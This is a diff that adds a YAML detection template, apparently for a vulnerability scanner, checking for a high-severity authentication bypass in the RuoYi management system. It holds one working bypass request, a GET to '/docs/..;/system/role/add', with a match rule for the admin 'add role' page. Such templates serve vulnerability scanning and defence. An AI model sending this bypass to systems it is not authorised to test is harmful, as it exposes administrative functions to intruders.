@@ -1,0 +1,16 @@
+id: poc-yaml-ruoyi-manage-system-auth-bypass
+info:
+  name: Ruoyi管理系统权限绕过漏洞
+  severity: high
+  tags:
+  - 权限绕过
+  finger: Ruoyi
+  osprey-id: vb_2020_0049
+requests:
+- method: GET
+  path: /docs/..;/system/role/add
+  expression: 'status_code == 200 && contains(body, "新增角色")
+
+    '
+variables: {}
+transport: http
